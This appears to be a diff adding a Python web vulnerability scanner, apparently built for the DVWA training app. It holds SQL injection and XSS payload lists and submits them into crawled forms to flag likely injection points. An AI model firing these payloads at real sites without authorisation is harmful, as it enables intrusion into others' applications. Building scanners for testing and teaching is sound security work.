@@ -1,0 +1,302 @@
+import json
+import os
+
+from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
+
+
+DEFAULT_SQL_PAYLOADS = [
+    "1'",
+    "' OR 1=1 --",
+    "' OR '1'='1",
+    "1' OR '1'='1",
+    "1' OR 1=1--",
+    "admin'--",
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+]
+
+SQL_ERROR_KEYWORDS = [
+    "sql",
+    "mysql",
+    "syntax",
+    "warning",
+    "error",
+    "you have an error in your sql syntax",
+    "unclosed quotation mark",
+    "quoted string not properly terminated",
+    "sqlstate",
+    "odbc",
+    "sqlite",
+    "postgresql",
+]
+
+XSS_PAYLOADS = [
+    "<script>alert(1)</script>",
+    "\"><script>alert(1)</script>",
+    "'><script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg/onload=alert(1)>",
+]
+
+XSS_OUTPUT_JSON = "reports/xss_results.json"
+
+
+def _build_url_with_param(url, key, value):
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query, keep_blank_values=True)
+    params[key] = [value]
+    query = urlencode(params, doseq=True)
+    return urlunparse(parsed._replace(query=query))
+
+
+def _load_sql_payloads(path="sql.txt"):
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
+            if payloads:
+                return payloads
+    except Exception:
+        pass
+
+    return DEFAULT_SQL_PAYLOADS
+
+
+def _request(session, method, url, data=None):
+    method = (method or "GET").upper()
+    if method == "POST":
+        return session.post(url, data=data or {}, timeout=10, allow_redirects=True)
+
+    return session.get(url, params=data or {}, timeout=10, allow_redirects=True)
+
+
+def _form_defaults(form):
+    data = {}
+    for inp in form.get("inputs", []):
+        name = inp.get("name")
+        if not name:
+            continue
+
+        input_type = (inp.get("type") or "").lower()
+        value = inp.get("value")
+
+        if input_type in {"password", "file"}:
+            continue
+
+        if value is not None:
+            data[name] = value
+
+    return data
+
+
+def _record_sqli(results, action_url, method, payload):
+    seen = results.setdefault("_seen_sqli", set())
+    key = (action_url, method, payload)
+    if key in seen:
+        return
+
+    seen.add(key)
+    results["vulnerabilities"].append(
+        {
+            "url": action_url,
+            "method": method,
+            "payload": payload,
+            "type": "SQL Injection",
+            "severity": "High",
+        }
+    )
+    print("[Possible SQL Injection]", action_url, "payload:", payload)
+
+
+def _record_xss(results, action_url, method, payload):
+    seen = results.setdefault("_seen_xss", set())
+    key = (action_url, method, payload)
+    if key in seen:
+        return
+
+    seen.add(key)
+    results["vulnerabilities"].append(
+        {
+            "url": action_url,
+            "method": method,
+            "payload": payload,
+            "type": "XSS",
+            "severity": "Medium",
+        }
+    )
+
+    print("[Possible XSS]", action_url, "payload:", payload)
+
+
+def _xss_params_for_form(form):
+    action = (form.get("action") or "").lower()
+    page = (form.get("page") or "").lower()
+    scope = f"{action} {page}"
+
+    input_names = {inp.get("name") for inp in form.get("inputs", []) if inp.get("name")}
+    params = []
+
+    # Generic reflection targets
+    for candidate in ("name", "txtName", "mtxMessage", "message"):
+        if candidate in input_names:
+            params.append(candidate)
+
+    # DVWA-specific endpoints may require fields not represented as <input> in crawler output.
+    if "/vulnerabilities/xss_r/" in scope and "name" not in params:
+        params.append("name")
+    if "/vulnerabilities/xss_s/" in scope:
+        if "txtName" not in params:
+            params.append("txtName")
+        if "mtxMessage" not in params:
+            params.append("mtxMessage")
+
+    # Preserve order and uniqueness.
+    unique = []
+    seen = set()
+    for p in params:
+        if p in seen:
+            continue
+        seen.add(p)
+        unique.append(p)
+
+    return unique
+
+
+def _build_xss_probe_data(form, base_data, target_param, payload):
+    probe = dict(base_data)
+
+    # DVWA stored-XSS typically needs both fields populated.
+    if target_param != "txtName" and "txtName" in probe:
+        probe["txtName"] = probe.get("txtName") or "scanner"
+    if target_param != "mtxMessage" and "mtxMessage" in probe:
+        probe["mtxMessage"] = probe.get("mtxMessage") or "scanner"
+
+    probe[target_param] = payload
+    return probe
+
+
+def _write_xss_results(results, output_path=XSS_OUTPUT_JSON):
+    xss_only = []
+    seen = set()
+
+    for vuln in results.get("vulnerabilities", []):
+        if vuln.get("type") != "XSS":
+            continue
+
+        key = (
+            vuln.get("url"),
+            vuln.get("method"),
+            vuln.get("payload"),
+            vuln.get("severity"),
+        )
+        if key in seen:
+            continue
+        seen.add(key)
+
+        xss_only.append(
+            {
+                "url": vuln.get("url"),
+                "method": vuln.get("method", "GET"),
+                "payload": vuln.get("payload"),
+                "type": "XSS",
+                "severity": vuln.get("severity", "Medium"),
+            }
+        )
+
+    os.makedirs(os.path.dirname(output_path), exist_ok=True)
+    with open(output_path, "w", encoding="utf-8") as xf:
+        json.dump({"vulnerabilities": xss_only}, xf, indent=4)
+
+
+def scan_sql(form, session, results, sql_payloads):
+    action = form.get("action") or form.get("page")
+    method = (form.get("method") or "GET").upper()
+
+    input_names = [inp.get("name") for inp in form.get("inputs", []) if inp.get("name")]
+    if "id" not in input_names:
+        return
+
+    baseline_data = _form_defaults(form)
+    baseline_data["id"] = "-1"
+
+    try:
+        baseline = _request(session, method, action, baseline_data)
+    except Exception:
+        return
+
+    baseline_body = baseline.text.lower()
+    baseline_len = len(baseline_body)
+
+    for payload in sql_payloads:
+        probe_data = _form_defaults(form)
+        probe_data["id"] = payload
+
+        try:
+            response = _request(session, method, action, probe_data)
+        except Exception:
+            continue
+
+        body = response.text.lower()
+
+        has_new_sql_error = any(k in body for k in SQL_ERROR_KEYWORDS) and not any(
+            k in baseline_body for k in SQL_ERROR_KEYWORDS
+        )
+
+        # DVWA-style content indicators
+        positive_terms = ["first name", "surname", "exists in the database", "user id"]
+        positive_delta = sum(body.count(t) for t in positive_terms) - sum(baseline_body.count(t) for t in positive_terms)
+
+        length_delta = abs(len(body) - baseline_len)
+        strong_diff = positive_delta >= 1 or length_delta > max(120, int(baseline_len * 0.30))
+
+        if has_new_sql_error or strong_diff:
+            _record_sqli(results, action, method, payload)
+
+
+def scan_xss(form, session, results):
+    action = form.get("action") or form.get("page")
+    method = (form.get("method") or "GET").upper()
+
+    params = _xss_params_for_form(form)
+    if not params:
+        return
+
+    base_data = _form_defaults(form)
+
+    for param in params:
+        for payload in XSS_PAYLOADS:
+            probe_data = _build_xss_probe_data(form, base_data, param, payload)
+
+            try:
+                response = _request(session, method, action, probe_data)
+            except Exception:
+                continue
+
+            body = response.text
+            lower = body.lower()
+
+            reflected = payload in body
+            dangerous_context = any(key in lower for key in ["<script", "onerror=", "onload=", "javascript:"])
+
+            if reflected and dangerous_context:
+                _record_xss(results, action, method, payload)
+
+
+def run_scanner(results, session):
+    print("\nStarting Scanner...\n")
+
+    forms = results.get("forms", [])
+    if not forms:
+        print("No forms found to scan.")
+        return
+
+    sql_payloads = _load_sql_payloads()
+
+    for form in forms:
+        page = form.get("page", "unknown")
+        print("Scanning form on:", page)
+        scan_sql(form, session, results, sql_payloads)
+        scan_xss(form, session, results)
+
+    results.pop("_seen_sqli", None)
+    results.pop("_seen_xss", None)
+    _write_xss_results(results)
